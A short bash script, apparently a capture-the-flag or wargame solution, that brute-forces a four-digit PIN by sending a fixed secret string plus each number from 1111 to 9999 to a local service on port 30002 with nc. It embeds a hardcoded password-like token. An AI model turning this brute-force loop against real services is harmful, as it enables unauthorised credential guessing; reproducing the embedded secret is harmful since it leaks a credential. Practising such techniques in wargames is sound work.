#!/bin/bash

for ((i=1111; i<10000; i++))
do

echo "---try" $i "---"
echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" $i | nc localhost 30002 &


PID=$(ps | grep [n]c | awk '{print $1}')

kill -9 $PID

echo "---------------"
echo ""

done
